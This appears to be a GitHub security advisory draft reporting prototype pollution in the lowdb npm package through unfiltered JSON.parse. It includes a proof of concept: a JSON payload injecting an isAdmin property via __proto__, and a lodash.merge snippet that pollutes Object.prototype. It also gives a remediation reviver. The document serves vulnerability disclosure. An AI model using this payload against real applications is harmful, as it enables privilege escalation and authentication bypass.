<!-- GITHUB SECURITY ADVISORY SUBMISSION -->
<!-- Title:              Prototype Pollution via JSON.parse Without Reviver in lowdb -->
<!-- Severity:           High -->
<!-- Ecosystem:          npm -->
<!-- Package name:       lowdb -->
<!-- Affected versions:  <= 7.0.1 -->
<!-- Patched versions:   (leave blank) -->
<!-- CWE:                CWE-1321 -->

## Summary

lowdb v7.0.1's `JSONFile` adapter uses raw `JSON.parse` without a reviver function, allowing `__proto__` and `constructor.prototype` keys to persist as own properties in parsed database objects. When applications merge this data using common patterns (`Object.assign`, `lodash.merge`, `_.defaultsDeep`), `Object.prototype` is polluted, potentially enabling privilege escalation.

## Details

`JSONFile` passes raw `JSON.parse` as the parse function to `DataFile` (`lib/adapters/node/JSONFile.js`, line 5):

```javascript
super(filename, {
    parse: JSON.parse,  // No reviver to filter __proto__/constructor
    stringify: (data) => JSON.stringify(data, null, 2),
});
```

When `DataFile.read()` is called (`lib/adapters/node/DataFile.js`, line 17), it invokes `this.#parse(data)` — which is the raw `JSON.parse`. The parsed object preserves `__proto__` as an own property.

`Low.read()` (`lib/core/Low.js`, lines 16-18) then directly assigns this attacker-controlled object:

```javascript
async read() {
    const data = await this.adapter.read();
    if (data) this.data = data;  // Attacker-controlled object IS the database
}
```

## PoC

```javascript
// 1. Attacker submits payload to an Express API that stores it in lowdb:
// POST /api/users  {"name":"evil","__proto__":{"isAdmin":true}}

// 2. JSON.parse preserves __proto__ as own property:
const raw = JSON.parse('{"__proto__":{"polluted":"yes"}}');
const desc = Object.getOwnPropertyDescriptor(raw, '__proto__');
console.log(desc);
// { value: { polluted: 'yes' }, writable: true, enumerable: true, configurable: true }

// 3. Common server-side merge pattern triggers pollution:
import _ from 'lodash';
const userFromDb = JSON.parse('{"name":"evil","__proto__":{"isAdmin":true}}');
const config = {};
_.merge(config, userFromDb);  // Pollutes Object.prototype

const test = {};
console.log(test.isAdmin); // true — every object in the process is now "admin"
```

**Tested and confirmed** on Node.js v20.19.2: `JSON.parse` preserves `__proto__` as an own property. Exploitable with any deep-merge utility that does not filter prototype keys.

## Impact

Applications using lowdb that store user-controlled data and later merge it using `lodash.merge()`, `_.defaultsDeep()`, or similar recursive merge functions are vulnerable to prototype pollution. This can lead to:

- Privilege escalation (e.g., `isAdmin` injection)
- Authentication bypass
- Remote code execution (in combination with other gadgets)

## Remediation

Use a JSON reviver that strips dangerous keys:

```javascript
const safeParse = (text) => JSON.parse(text, (key, value) => {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') return undefined;
    return value;
});
```
